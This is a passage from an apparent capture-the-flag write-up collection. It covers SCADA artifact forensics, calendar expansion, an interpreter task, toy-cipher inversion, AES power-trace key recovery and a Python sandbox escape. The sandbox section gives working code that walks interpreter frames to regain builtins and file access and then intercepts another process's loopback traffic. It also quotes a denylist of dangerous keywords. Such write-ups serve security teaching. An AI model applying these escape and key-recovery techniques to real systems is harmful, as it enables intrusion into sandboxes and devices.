    <Payload type="ALARM_OVERRIDE_PATTERN">55 FA 55 FA 55 FA 55 FA 55 FA 55 FA 55 FA 55 FA</Payload>
  </HiddenModbusWrite>
</CalibrationRoutine>
```

That `HiddenModbusWrite` is frame 31 exactly — same function, start, count and data, same PLC. The
file also gives `station_id 0x4A2E` (the brief's station), version `3.2.1`, and
`ManifestSeed 137` — the calibration seed.

**3. The PLC firmware**

```sh
xxd -g 1 -l 64 plc_firmware.bin
```

```
00000000: 50 4c 43 31 56 33 2e 32 2e 31 00 00 7f 00 00 04  PLC1V3.2.1......
00000010: 00 44 54 56 53 56 68 55 5b 56 54 5c 58 42 43 68  .DTVSVhU[VT\XBCh
```

Offsets `0x00`–`0x03` are the magic `50 4c 43 31` (`PLC1`); `0x04`–`0x09` is `V3.2.1` (the HMI's
version); `0x0d`–`0x10` is `00 00 04 00`, the file size 1024. The 19 bytes at `0x11`–`0x23` look out
of place, and exactly one single-byte XOR key turns them into `[a-z0-9_]`:

```sh
python3 -c '
blob = open("plc_firmware.bin","rb").read()[0x11:0x24]
allowed = b"abcdefghijklmnopqrstuvwxyz0123456789_"
for k in range(256):
    t = bytes(b ^ k for b in blob)
    if all(c in allowed for c in t): print(hex(k), t.decode())
'
```

```
0x37 scada_blackout_2026
```

`scada_blackout_2026` is the bait: hidden, named after the incident, and mentioned in no other file,
so nothing corroborates it. The rest of the image (from `0x24`) is filler from a GF(2) linear
recurrence over 16-bit big-endian words — another rabbit hole. What the firmware contributes is only
its first four header bytes, `50 4c 43 31`.

**4. The event log**

```sh
jq -r '.[] | "\(.timestamp)  \(.level)  \(.message)"' substation_log.json
```

```
2025-11-15T06:15:00Z  INFO      Loading Q3_Equipment_Calibration.xml configuration
2025-11-15T06:15:03Z  WARNING   Unexpected Modbus FC 0x10 write to read-only registers 40001-40064
2025-11-15T06:15:03Z  CRITICAL  Buffer overflow detected in Modbus TCP handler (247 bytes vs 128-byte limit)
2025-11-15T06:15:04Z  CRITICAL  Alarm thresholds modified — High Temp: 85°C→250°C, Low Pressure: 2.0bar→0.1bar, Overcurrent: 500A→5000A
2025-11-15T06:15:05Z  WARNING   Unusual outbound traffic to 198.51.100.42:443
2025-11-15T06:15:10Z  CRITICAL  Firmware integrity check failed — possible tampering
2025-11-15T06:30:00Z  ERROR     Power outage detected at substation 0x4A2E
```

This is the PLC's side: the HMI routine loads, the firmware flags the FC 0x10 write to the same 64
registers, a buffer overflow follows (247 B vs a 128-byte limit — and 128 B is exactly what 64
registers take), thresholds change, traffic leaves, the integrity check fails, and `0x4A2E` loses
power. The startup event also carries `manifest_seed: 137`.

Crucially, the log's clock does not agree with the capture's: the write is 06:15:03Z here but
06:05:03 UTC in the pcap, and the outbound traffic is 06:15:05Z/port 443 here but 06:05:18 UTC/port
80 in the pcap. A single 10-minute offset would reconcile the write but not the exfil, so **no
timestamp can be "agreed" between the two files.** The one time the marker uses is the log's first
`CRITICAL` event — the buffer overflow — `2025-11-15T06:15:03Z`.

**5. The alarm overrides**

```sh
xxd -g 1 alarm_override.dat
```

Magic `ALRM`, a little-endian record count `03 00`, and the station as a 32-bit LE integer
`2e 4a 00 00` = `0x4A2E`. Each of the three 42-byte records is `>HII32s` (register, original,
override, NUL-padded name); 10 + 3×42 = 136 B parses the whole file:

```
register 40100: 85 -> 250   (High Temperature Alarm)
register 40101: 200 -> 10   (Low Pressure Alarm)
register 40102: 500 -> 5000 (Overcurrent Protection)
```

These are the log's 06:15:04Z threshold changes. Note `0x55` = 85 and `0xFA` = 250, so the `55 FA`
write pattern spells the temperature override in hex.

**6. Separating decoys from agreed facts**

Lining the files up, the clean cross-artifact agreements are the station, the write register and the
calibration seed. The traps:

- `scada_blackout_2026` lives only in the firmware — nothing corroborates it.
- `55 FA` appears in several files but is a *pattern repeated eight times*, not a single value.
- `198.51.100.42` appears in pcap and log, but the port disagrees (80 vs 443), so it is not clean
  agreement.
- The two clocks disagree, so no write time is shared across files.

**7. Building the marker**

No file spells the flag out, so it is built. The construction for this class of challenge is: join
the agreed values with `:`, SHA-256, keep the first eight hex. The accepted preimage joins, in
attack-chain order through the layers, the firmware identity, the station, the first-CRITICAL
timestamp and the write register, with the calibration seed last:

| Slot | Value | Source / rendering |
| --- | --- | --- |
| firmware | `0x504C4331` | `plc_firmware.bin[0:4]` as `0x`-prefixed **uppercase** hex |
| station | `0x4A2E` | HMI `station_id`, log outage event, alarm header |
| timestamp | `2025-11-15T06:15:03Z` | log first `CRITICAL` (the overflow) |
| register | `40001` | HMI `start_address`, pcap frame 31 (`9c 41`), log `40001-40064` |
| seed | `137` | HMI `ManifestSeed`, log `manifest_seed` |

Hash with `printf '%s'` so no newline is added:

```sh
printf '%s' '0x504C4331:0x4A2E:2025-11-15T06:15:03Z:40001:137' | shasum -a 256
```

```
12fcdb0d35f7fde4685d2f6995958f107ec9b5dd8a2ffd74e8fd44a6ff8ea85b  -
```

The first eight hex give the flag: **`CSCTF{12fcdb0d}`**. (Using `echo` instead appends a newline and
yields a completely different digest — a common way to lose this.)

A standalone `solve.py` re-derives every field from the files and asserts that every artifact
recording a value gives the same one before hashing. Its core parses the pcap with the standard
library, pulls the HMI/log/alarm values, and checks agreement:

```python
def agree(what, *values):
    if len(set(values)) != 1:
        raise SystemExit(f"{what}: artifacts disagree: {values}")
    return values[0]

firmware = "0x" + open("plc_firmware.bin","rb").read()[:4].hex().upper()   # 0x504C4331
station  = agree("station", hmi_station, log_station, alarm_station)       # 0x4A2E
timestamp = [e for e in log if e["level"]=="CRITICAL"][0]["timestamp"]     # 2025-11-15T06:15:03Z
register = agree("register", hmi_start, pcap_register, log_first)          # 40001
seed     = agree("seed", hmi_seed, *log_seeds)                             # 137
marker = ":".join(str(v) for v in (firmware, station, timestamp, register, seed))
print("CSCTF{%s}" % hashlib.sha256(marker.encode()).hexdigest()[:8])       # CSCTF{12fcdb0d}
```

**Why it works**

The five files are one attack seen from different layers: the HMI hides a function 16 write, the
capture shows that write going to the PLC at register 40001, the log records the overflow it caused,
and the alarm file holds the thresholds it changed — all at substation `0x4A2E`. The marker
fingerprints the incident with exactly the values the artifacts corroborate (firmware identity,
station, first-critical timestamp, write register) plus the calibration seed. Any change of value,
case, field order, or a stray newline in the hashed string changes the digest completely, which is
what forces a single canonical preimage.

**Validation / reproduction**

We worked this challenge independently in parallel, and in the end .dev is the one who figured it out.
The files alone left the construction open, so both of us tested ranked candidates built from the
agreed values — reasoned permutations under an ambiguous spec, not a blind sweep — over several
hours. The platform carried no wrong-answer penalty, and the organizers, acknowledging the ambiguity,
raised the submission rate limit and issued progressive public clarifications in #news: the flag is
built rather than found, `scada_blackout_2026` is a decoy, colon-join the values the artifacts agree
on, SHA-256 and keep the leading hex, and finally that it is exactly four corroborated single values
plus the calibration seed with the leading 8 hex kept. With that, the accepted construction was the
`0x`-uppercase firmware header, then station, the first-CRITICAL ISO timestamp, register and seed, in
attack-chain order. A standalone script re-derives every field from the files and checks that every
artifact recording a value agrees before hashing. (A later staff clue confirmed exactly that field
order.)

Reproduction: hash `0x504C4331:0x4A2E:2025-11-15T06:15:03Z:40001:137` with SHA-256 (no trailing
newline) and keep the first eight hex. Gotcha: render the firmware header as `0x`-prefixed uppercase,
keep the fields in attack-chain order, and never let `echo` append a newline.


## Misc

### Command Calendar Reconciliation

> Misc · Easy · Chronos Security  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{Eeh2RYL9qlIO3A2Hema1QimW}`

This challenge runs in `flag_mode: random`: the restoration code is minted per spawned instance, so the value above is the one returned by the instance solved in this session and will differ on any relaunch. What reproduces is the method, not the literal string.

**Challenge**

The per-team instance is a small web service, but the puzzle is an iCalendar (RFC 5545) recurrence-expansion problem, not a web exploit. The brief: *a hostile edit scrambled an emergency relay calendar during a communications outage; rebuild the activations and submit a UTC attestation.* It serves two endpoints:

- `GET /brief` — the response window (a half-open date range), the per-record shape `{uid, recurrence_id_utc, start_utc, end_utc, category}`, the ordering rule ("sort by start"), and the exact attestation JSON format.
- `GET /case.ics` — the exported iCalendar file with the recurring events.

Each relaunch generates a fresh calendar, so everything below was derived from the running instance's own `/brief` and `/case.ics`, never from cached data. The instance is launched through the CTFd `docker_per_team` plugin (`POST /containers/api/request {"chal_id": 9102}`, then poll `GET /containers/api/view_info`) and came up at `http://<instance>` for this session; all work stayed on that assigned address.

**Approach / walkthrough**

1. **Read the brief.** For this instance the response window was `[2026-07-20, 2026-08-04)` — half-open, so the upper bound is exclusive. The decisive rule: membership is decided on the activation's *actual* start (after any override is applied), not on the nominal recurrence slot. The brief expected exactly 24 records, each serialized as `{uid, recurrence_id_utc, start_utc, end_utc, category}` and sorted by `start_utc`.

2. **Read the calendar.** `/case.ics` held three master `VEVENT`s, each an `RRULE` with a mix of `RDATE` additions, `EXDATE` removals, and detached overrides (each carrying its own `RECURRENCE-ID` plus `DTSTART`/`DTEND`):
   - **relay-1** — `RRULE:FREQ=DAILY;INTERVAL=2;COUNT=12` from `07-16`, plus `RDATE 07-21`, `EXDATE 07-26`, and two detached overrides: `RECURRENCE-ID 07-20` moved to `07-19 07:00` (which pushes it *out* of the window) and `RECURRENCE-ID 08-05` moved to `08-03 07:00` (which pulls it *into* the window).
   - **relay-2** — `RRULE:FREQ=WEEKLY;BYDAY=MO,WE,FR;COUNT=12` from `07-20`, plus `RDATE 07-25`.
   - **relay-3** — `RRULE:FREQ=DAILY;INTERVAL=2;UNTIL=08-04T13` from `07-17`, plus `RDATE 07-20`.

3. **Expand in strict RFC 5545 order.** The whole challenge is doing these operations in the right order and testing the window on the overridden start:
   1. Generate the nominal recurrence set from each `RRULE` (respecting `COUNT`/`UNTIL`/`INTERVAL`/`BYDAY`).
   2. Add `RDATE` instances.
   3. Remove `EXDATE` instances.
   4. Replace any instance whose slot matches a detached override's `RECURRENCE-ID` with the override's own values — including the override's own `DTEND`, since an override can change the duration.
   5. Only *now* filter on the actual `start_utc` against the half-open window.
   6. Sort by `start_utc`.

   Re-derived at write-up time from the rules above (2026-07-20 is a Monday):

   | Master | In-window activations | Count |
   |---|---|---|
   | relay-1 | nominal 07-22, 07-24, 07-28, 07-30, 08-01, 08-03 (07-16/07-18 before the window; 07-20 overridden out to 07-19; 07-26 `EXDATE`'d) + `RDATE` 07-21 + override RID 08-05 now starting 08-03 07:00 | 8 |
   | relay-2 | MO/WE/FR 07-20, 07-22, 07-24, 07-27, 07-29, 07-31, 08-03 + `RDATE` 07-25 | 8 |
   | relay-3 | 07-21, 07-23, 07-25, 07-27, 07-29, 07-31, 08-02 (07-17/07-19 before; 08-04 excluded by the half-open bound) + `RDATE` 07-20 | 8 |

   8 + 8 + 8 = **24**, matching the count the brief called for. Note relay-1 ends with two activations on 08-03: its own nominal slot and the 08-05 instance moved onto that date.

4. **Build and submit the attestation.** A short per-instance Python script performed steps 1–6, serialized the 24 records into the attestation JSON exactly as `/brief` specified, and posted it:

   ```
   POST /attest    { ...24 activations, sorted by start_utc, in the brief's format... }
   ```

   The server validated the set and returned the restoration code:

   ```
   routing_authorization: CSCTF{Eeh2RYL9qlIO3A2Hema1QimW}
   ```

**Why it works**

The traps are all ordering mistakes in a naive expansion. Filtering the nominal slots against the window *before* applying overrides loses the 08-05 slot that moved to 08-03 and keeps the 07-20 slot that moved to 07-19 — both wrong. Other traps: dropping an override's own modified `DTEND`; letting an `EXDATE`'d slot reappear; and treating the upper bound of the half-open window as inclusive. `EXDATE`/`RDATE` and overrides interact (an `EXDATE`'d slot must not come back; an override replaces rather than adds). Follow the RFC 5545 operation order and test membership on the overridden start, and the 24-record set is unambiguous.

**Validation / reproduction**

The expansion produced exactly the 24 records the brief called for, and `/attest` accepted the set and returned the code — a single self-checking confirmation, since a wrong set is rejected. The first three CTFd submissions came back `ratelimited` (platform-wide pacing during the wave rush, never a judged verdict); the same single value was accepted on a later send. The operational lesson recorded during the solve: a `ratelimited` response is not a verdict, so it is neither counted toward the 3-wrong guard nor deduped — the same reasoned flag is resent once the limit clears.

Reproduction: spawn the instance and record its address; `GET /brief` (window, record fields, sort key, attestation shape); `GET /case.ics` and parse every `VEVENT` (masters with `RRULE`/`RDATE`/`EXDATE`, and detached overrides with `RECURRENCE-ID` + their own `DTSTART`/`DTEND`); expand nominal → add `RDATE` → remove `EXDATE` → apply overrides (replace, keep override `DTEND`) → filter on actual `start_utc` against the half-open window → sort by `start_utc`; serialize to the brief's format and `POST /attest`.

### golem

> Misc · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{8JJeMxnQzIblnLwiNtqBydFu}`

(Per-team `flag_mode: random`; the value above is the one the assigned instance returned.)

**Challenge**

> During Operation Dawn, Ash Army signals engineers tested relay firmware on a small register machine they call the golem. A coalition team captured its specification and a set of worked examples. The machine's audit service runs 100 programs, each with an input tape, and checks your answer against what the golem would print, exactly, quirks included. One wrong answer closes the session. Build an interpreter that behaves as the specification and the examples describe, and answer every program.

The target is a per-team TCP container (port 9999). The handout `golem.tar.gz` holds `SPEC.md` (the definition of **GASM**, "Golem Assembly", and the wire protocol) and `examples.txt` (24 worked programs with exact output — examples 1–10 each isolate one quirk, the other 14 are random programs like the ones the server sends). Tooling is Python: a from-scratch interpreter and a small TCP client.

**The machine.** 16 registers `r0..r15`, each unsigned 16-bit, all starting at 0; an input tape read left-to-right by `in`; an output stream appended to by `out`. Instructions: `set mov add sub mul div mod and or xor shl shr not in out`. Control flow is only nested structured blocks — `rep N … end`, `ifz rX … end`, `ifn rX … end` — with no jumps, so every program terminates.

**Approach / walkthrough**

1. **Pin the quirks.** The machine is fully specified; the only difficulty is that 100 answers in a row must all be correct, and one mistake handled the "natural" way instead of the golem's way ends the session. So every rule that differs from a naive implementation was listed and confirmed against the examples before connecting:

   | Quirk | Rule |
   |---|---|
   | Width | every register write is `& 0xFFFF` (add/sub/mul wrap) |
   | `set` immediate | signed decimal taken mod 65536 (`-1`→65535, `70000`→4464) |
   | `div` by 0 | result 65535; otherwise unsigned floor division |
   | `mod` by 0 | result is the dividend, unchanged |
   | Shifts | shift count masked `& 15`; `shr` is logical |
   | `not` | `(~x) & 0xFFFF` |
   | `in` past the tape end | returns 65535 |
   | `rep N` | body runs exactly N times (`N=0` → zero times) |
   | `ifz`/`ifn` | condition tested once on entry; later writes inside the body do not re-test |
   | Operand order | sources read before the destination is written (`add r0 r0 r0` doubles r0) |

2. **Build a tree-walking interpreter** (`solve/gasm.py`). Parse the program into a nested block tree (`rep`/`ifz`/`ifn` open a sub-block, `end` closes it; indentation is cosmetic and ignored). Execute by recursively walking the tree: `rep` runs its body `int(N)` times; `ifz`/`ifn` read the register once then run the body at most once; three-operand ops read `y` and `z` first, compute, then store `R[rX] = v & 0xFFFF` (covering the width and operand-order quirks in one place); `div`/`mod` special-case a zero divisor; shifts mask the count `& 15`. It fails closed: an unknown opcode raises rather than answering, and a bad register index trips an assert, because a wrong answer closes the session.

3. **Verify against the handout.** The interpreter reproduced all 24 example outputs exactly (`24 / 24`) — re-run while writing up. All 10 quirk demos and all 14 random programs match, so we were confident to spend the single live session.

4. **Automate the audit** (`solve/client.py`). Open a plain TCP socket; for each round, buffer input until the `OUTPUT>` prompt, find the last `PROGRAM` line in the chunk (skipping the ASCII-art banner and the previous round's `OK`), collect lines to the `.` terminator, parse the `INPUT` tape, run `gasm.run(prog, tape)`, and send the space-joined outputs (a bare newline for empty output). After 100 correct rounds the service prints the flag. From `solve/session.log`: 100 `OK`, 0 `WRONG`, and the closing message:

   ```
   The golem bows. CSCTF{8JJeMxnQzIblnLwiNtqBydFu}
   ```

**Why it works**

The machine is deterministic and fully specified; the only real content is the unusual edge cases (division and mod by zero, wrapping, tape over-read, shift masking, once-only block tests, operand aliasing). An interpreter that gets every one right produces the same output as the reference, so all 100 programs pass. The 24 worked examples exercise exactly those edge cases, so the interpreter can be validated completely offline before the one-shot session is spent.

**Validation / reproduction**

The interpreter matched all 24 handout examples before any network use. Against the live service it answered all 100 rounds and received the flag; because the service checks every round and closes on a wrong answer, a complete run is itself proof the interpreter is correct. The flag was submitted once through the guarded CLI path and accepted (`tried.json`: one attempt, `correct`). The only network traffic was the single session against the team's own assigned instance — no scanning, no retries.

Reproduction: extract `golem.tar.gz`; run `gasm.py` against `examples.txt` and confirm `24/24`; spawn the team's 9141 container; run `client.py host port` for the 100-round session; read the `CSCTF{...}` from the closing message.

### lattice

> Misc · Easy · Iulian Schifirnet  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{Ia0OI44KTJzr9lcWPNAkpFVB}`

(Per-team `flag_mode: random`; the value above is the one the assigned vault returned.)

**Challenge**

> During Operation Dawn, Ash Army couriers sealed a passphrase inside a home-built block scrambler, then lost the key to their own vault. A coalition team recovered the scrambler's source and the sealed bytes it produced, but nothing that runs it backward. The vault door at the audit service opens only for the original passphrase, spoken exactly once. Read the source, recover the passphrase offline, and speak it to the vault.

A per-team TCP container (port 9999) plus one attachment, `lattice.tar.gz`, holding a single file `lattice.py`. It contains the **forward** cipher only (`encrypt_block`, `encrypt`, no decrypt routine), `TARGET` — a 48-byte ciphertext equal to `encrypt(SECRET)` — and a `check(guess)` helper. The whole challenge is reading the cipher and running it backward; tooling is Python only.

**The cipher.** An 8-byte-block toy SPN in ECB mode with PKCS#7 padding, 16 rounds:

| Component | Detail |
| --- | --- |
| Key mixing | even rounds `s[i] = (s[i] + rk[i]) mod 256`; odd rounds `s[i] ^= rk[i]` |
| S-box | a permutation of 0..255 built by Fisher–Yates driven by a custom 32-bit LCG (`s = s*0x19660D + 0x3C6EF35F mod 2³²`, seed `0x1A2B3C4D`) |
| Round keys | 16×8 bytes, the low byte of each output of the same LCG with seed `0xCAFEB0BA` |
| Diffusion | the block packed big-endian into a 64-bit integer and rotated left by `(7r + 11) % 63 + 1` bits |

**Approach / walkthrough**

1. **Read the cipher.** Nothing in it is secret: the "key" is two hard-coded LCG seeds, so the S-box and all 16 round keys can be rebuilt exactly from the source. Every layer is also a bijection — modular add ↔ modular subtract, XOR ↔ XOR, the S-box is a permutation (so it has an inverse table), and a 64-bit left rotation ↔ a right rotation by the same amount. The name "lattice" and the "preimage" wording are flavor, not lattice reduction.

2. **Invert each round.** Decryption is mechanical: run rounds 15 down to 0, and in each undo the rotation, then the S-box, then the key mixing. `solve_inverse.py` rebuilds the S-box and round keys from the same seeds and decrypts:

   ```python
   def dec(b):
       s = list(b)
       for r in range(15, -1, -1):
           x = rotr(int.from_bytes(bytes(s), 'big'), rot(r) & 63); s = list(x.to_bytes(8, 'big'))
           s = [inv[c] for c in s]
           s = [(s[i] - RK[r][i]) & 255 if r % 2 == 0 else s[i] ^ RK[r][i] for i in range(8)]
       return bytes(s)
   ```

3. **Recover the passphrase.** Decrypting the six blocks of `TARGET` gives:

   ```
   b'unl0ck-th3-l4tt1ce-pre1mage-3f9a7c2e1b8d4a60\x04\x04\x04\x04'
   ```

   The trailing four `0x04` bytes are valid PKCS#7 padding, confirming block alignment. Stripping them leaves the passphrase `unl0ck-th3-l4tt1ce-pre1mage-3f9a7c2e1b8d4a60`.

4. **Speak it to the vault.** The passphrase is not the flag — "spoken exactly once" means the vault service returns the team's flag in exchange for it. `fire.py` opens one TCP connection to the team's own 9142 container, sends the passphrase followed by a newline, and reads the reply:

   ```
   The lattice yields: CSCTF{Ia0OI44KTJzr9lcWPNAkpFVB}
   ```

**Why it works**

The cipher ships its own key material as constants (both the S-box and the round keys derive from fixed LCG seeds), so it is effectively a fixed, keyless permutation that anyone with the source can invert. Each round is a composition of a bijective S-box, a rotation, and an add/XOR with a known key — all individually invertible — so the full 16-round transform inverts exactly in reverse order. No cryptanalysis is needed.

**Validation / reproduction**

The decrypted plaintext ended in correct PKCS#7 padding, and re-encrypting the recovered passphrase with a forward reimplementation reproduced `TARGET` exactly — an independent round-trip check done entirely offline, which proves the recovery before anything is sent. The solve script is a self-contained reimplementation, so the untrusted `lattice.py` never has to be run:

```
python3 -I workspace/9142-lattice/solve_inverse.py
# b'unl0ck-th3-l4tt1ce-pre1mage-3f9a7c2e1b8d4a60\x04\x04\x04\x04'
# b'unl0ck-th3-l4tt1ce-pre1mage-3f9a7c2e1b8d4a60'
# True
```

The service then accepted the passphrase and returned the per-team flag (CTFd `flag_mode: random`, 24 characters, which did not rotate). One submission was accepted as `correct` at 2026-11-07 13:07:56 UTC, about eight minutes after Wave 2 opened. All traffic went only to the team's assigned container: one connection, one line sent.

### Operation Dawn: The Cipher Lock

> Misc · Hard · Terminal43  
> Points: 540 · Flag submitted by: [.dev](https://github.com/d0td3v)

**The flag**

`CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}`

**Challenge**

> Operation Dawn, annex entry 12. An Ash field strongbox uses an electronic cipher lock. Investigators recorded its constructed power-trace corpus while known pass-codes were checked against the stored code. Recover that code; no physical hardware is required.

One attachment, `traces.npz` (593,514 bytes, SHA-256 `b27f89e646193c228ee823f1ad14be3e0260213a40e433d5f648c9b75e7ed67a`). A `.npz` is NumPy's archive format — a plain ZIP with one `.npy` per array — so `unzip -l traces.npz` lists the members without any special tooling. It holds three arrays:

- `traces` — `float32`, shape `(1500, 87)`: one power trace of 87 samples per pass-code check.
- `plaintexts` — `uint8`, shape `(1500, 47)`: the 1500 known pass-codes that were tried, 47 bytes each.
- `sbox` — `uint8`, shape `(256,)`: a 256-byte substitution table beginning `63 7c 77 7b f2 6b 6f c5 ...`.

This is a textbook correlation power analysis (CPA) side-channel problem. The only tool is Python with numpy.

**Approach / walkthrough**

1. **Identify the S-box.** The `sbox` member starts `63 7c 77 7b f2 6b ...`, which is the AES SubBytes table. We confirmed it by rebuilding the S-box from its GF(2⁸) definition (the multiplicative inverse modulo `x⁸+x⁴+x³+x+1`, then the affine map plus `0x63`) and comparing — an exact match. A 256-entry table shipped next to power traces strongly hints at what the lock computes.

2. **Find where the traces leak.** Averaging each of the 87 sample positions over all 1500 traces splits them into two groups: 47 positions average about 4 (the mean Hamming weight of a random byte), and the other 40 average about 0 and are pure noise with σ ≈ 4. So the stored code is 47 bytes long, each byte is handled at its own sample, and the leaking positions are scattered (you cannot assume byte `b` sits at sample `b`), so every sample has to be searched.

3. **Choose the leakage model.** The shipped S-box points at `v = SBOX[p[b] XOR code[b]]` — the AES AddRoundKey → SubBytes first-round model — with the power drawn at that instant rising with HW(`v`), the Hamming weight of `v`, plus noise. We know `p` for every trace and we know `SBOX`, so a single code byte has only 256 candidates.

4. **CPA on one byte.** For each guess `g` in 0..255, predict `HW(SBOX[p[b] ^ g])` across all 1500 traces, then take the Pearson correlation of that prediction against each of the 87 samples. The core is a vectorized correlation of the 256 prediction columns against the 87 trace columns:

   ```python
   HW = np.array([bin(v).count("1") for v in range(256)])
   value = codes[:, b, None] ^ np.arange(256)   # p[b] ^ g, 1500 x 256
   pred  = HW[sbox[value]].astype(np.float64)    # HW(SBOX[p ^ g])
   pz = (pred - pred.mean(0)) / pred.std(0)
   tz = (traces - traces.mean(0)) / traces.std(0)
   r  = np.abs(pz.T @ tz) / len(traces)          # 256 guesses x 87 samples
   ```

   For byte 0, guess `0x43` ('C') won with |r| = 0.336 at sample 58, against 0.119 for the runner-up — almost 3×. `0x43` is `C`, which is how a `CSCTF{` flag opens, so the stored code is probably the flag itself.

5. **Confirm the S-box is load-bearing.** Running the same attack with the naive `HW(p ^ g)` model (leakage straight from the XOR comparison) makes nothing stand out: every guess stays around 0.10, and the top guesses come in complementary pairs (e.g. `0x5d`/`0xa2`), because HW(x ⊕ 0xff) = 8 − HW(x) ties a guess and its complement under any linear model. The non-linear S-box is what separates the true byte from the wrong ones.

6. **All 47 bytes.** Running the CPA on every byte gives a clear winner each time: |r| roughly 0.29–0.38, while the best wrong guess never rises above 0.152. The 47 winning bytes decode to:

   ```
   CSCTF{12_the_depot_is_unguarded_at_noon_7d3e90}
   ```

   The 47 peak samples turn out to be exactly the 47 high-mean positions found in step 2, so every leaking sample is accounted for.

**Why it works**

The lock never reveals its code, but each check's power draw depends on a known pass-code byte combined with one secret byte. That divisibility is the whole attack: each byte can be attacked on its own — 47 × 256 guesses instead of 256⁴⁷. For each guess, CPA correlates predicted Hamming weights against the measured power; only the true byte predicts what the device actually leaked, and the S-box's non-linearity turns every wrong guess into noise. The peak height matches theory: a random byte's Hamming weight has variance 2, the noise variance is about 16 (σ ≈ 4), so the right guess should correlate at √(2/18) ≈ 0.33 — exactly the size of every observed peak — while 1500 traces hold the wrong guesses down near 0.1.

**Validation / reproduction**

Every byte's winner (|r| ≈ 0.29–0.38) beats its runner-up (never above 0.152) by roughly 2× or more; the 47 peak samples are exactly the 47 high-mean positions from step 2 (nothing in the traces left unexplained); and the result reads as a well-formed flag. Taken together these are three independent confirmations before submission. Accepted on the first submission.

Reproduction: `file traces.npz && unzip -l traces.npz` to confirm the three arrays; load them with `np.load`; verify `sbox` against a from-scratch AES S-box; run the per-byte CPA above over all 47 bytes with the `HW(SBOX[p ^ g])` model; read the 47 winners as ASCII.

### Operation Dawn: The Fire-Control Terminal

> Misc · Easy · Terminal43  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

`CSCTF{AndAJ0TTZiiPTYMu9FmX2yy7}`

(Per-team random, 24-char body — the value above is the one captured against the assigned instance in this session.)

**Challenge**

> Operation Dawn, annex entry 13. We seized an Ash fire-control terminal intact and kept its console live. The console is locked down to a handful of operator expressions, but the command relay into it was never cut — orders are still arriving over it. Get onto the terminal and take down the standing order the relay keeps repeating.

The challenge ships **no files**: it is a live TCP console only, reached over the `docker_per_team` plugin API (`POST /containers/api/{request,view_info,...}` with `{"chal_id": 9124}`, capabilities `SETUID,SETGID,KILL`). Because there is no handout, the jail's own source was recovered in-band from the running instance once the escape below gave an output channel, and the exploit was developed directly against the assigned per-team instance. The brief maps straight onto the mechanism: the "console locked to a handful of operator expressions" is a restricted Python expression jail, and the "command relay that keeps repeating a standing order" is a separate process broadcasting the flag that has to be intercepted from inside the container.

Connecting shows a banner (`ASH ARMY // RESTRICTED // OPERATION DAWN`, `FIRE-CONTROL CONSOLE`) and a `>>>` prompt.

**Approach / walkthrough**

1. **Probe the console.** Each line is run as `exec(compile(src, '<console>', 'exec'), env, env)` with `env = {'__builtins__': {}}`; state persists for the connection. Results are never echoed — the only responses are silence (ran OK), `ERROR :: expression faulted` (an exception), or `DENIED :: expression not authorised on this console` (denylist hit). Literals, assignments, tuples, lambdas, generator expressions, attribute access and method calls all work; bare names like `len`/`chr`/`type` raise `NameError`, confirming no builtins in scope. A substring denylist on `src.lower()` rejects the whole input if any of `import eval exec compile breakpoint class bases base subclasses subclass globals builtins getattr setattr mro input open read system popen` appears. Crucially the *singular* forms `global`/`builtin` and the tokens `write`/`print`/`os`/`sys`/`frame`/`back`/`code`/`func`/`self` are allowed, and the filter is purely textual — so `'__buil'+'tins__'` and `'op'+'en'` slip past.

2. **Escape via frames.** Because `__class__`/`.mro`/`.__bases__`/`.__subclasses__` are all blocked, the usual class-hierarchy walk is closed. The surviving primitive is execution frames. A generator carries a reference to its own frame via `gi_frame`, and `f_back` chains up the call stack. A self-referential generator expression, forced by unpacking inside the eval frame, yields the running frame:

   ```python
   g = (g.gi_frame.f_back for _ in (1,))   # self-referential genexp
   F = (*g,)[0]                            # consume via unpack -> F is the <console> eval frame
   ```

   `F.f_globals` is unusable (`globals` is on the denylist), but `F.f_locals` is **not** filtered. Walking back up the C-level call chain reaches the `jail.py` module globals as a locals dict:

   ```python
   G = F.f_back.f_back.f_back.f_locals     # jail.py module-level namespace
   ```

3. **Regain real builtins and an in-band channel.** From those globals, recover the real builtins and `open`, splitting the forbidden literals to dodge the substring filter:

   ```python
   B = G['__buil'+'tins__']                # the real builtins module
   P = B.__dict__['op'+'en']               # real open()
   ```

   Since results are never echoed, blind ERROR-oracle byte-grinding was the planned fallback but was not needed: the request-handler frame holds the write stream for our own connection, so grabbing it turns the blind jail into a plaintext shell:

   ```python
   W = F.f_back.f_locals['wf']             # handler's write file -> our socket; W.write(x) prints back
   ```

4. **Locate the secret (it is not in the jail process).** Dumping recon with `W.write`: the jail process environment has `JAIL_PORT` and `DISPATCH_PORT=49513` but no `FLAG`; `/opt/jail.py` holds no flag; `/proc` shows (besides container init at pid 1) `init.py` (root), `sender.py` (uid 1001), and `jail.py` (uid 1000, us). `/opt/init.py` keeps the `FLAG` as root, pipes it on stdin to the relay (`sender.py`), and spawns children with the variable stripped from their environment. As uid 1000 we cannot read root's or uid 1001's memory, so the flag has to be taken in flight — exactly as the brief ("the command relay keeps repeating") says.

5. **Read the relay.** `/opt/sender.py` broadcasts the flag once a second as a UDP datagram to a fixed high loopback port (`DISPATCH_PORT` = 49513 on this instance, `127.0.0.1:49513`), base64url-encoded, prefixed with a `FIRE MISSION AUTH CODE ` string. The console and relay share the container network namespace, so loopback is shared. Binding that UDP port from inside the console and receiving one datagram captures the order:

   ```python
   U = SK.socket(SK.AF_INET, SK.SOCK_DGRAM)
   U.bind(('127.0.0.1', 49513))
   data = U.recvfrom(1024)                 # then W.write(data) back to us
   ```

   Captured payload:

   ```
   ASH CMD RELAY // ... FIRE MISSION AUTH CODE Q1NDVEZ7QW5kQUowVFRaaWlQVFlNdTlGbVgyeXk3fQ==
   ```

   Base64url-decoding the auth code:

   ```bash
   echo -n 'Q1NDVEZ7QW5kQUowVFRaaWlQVFlNdTlGbVgyeXk3fQ==' | base64 -d
   # -> CSCTF{AndAJ0TTZiiPTYMu9FmX2yy7}
   ```

**Why it works**

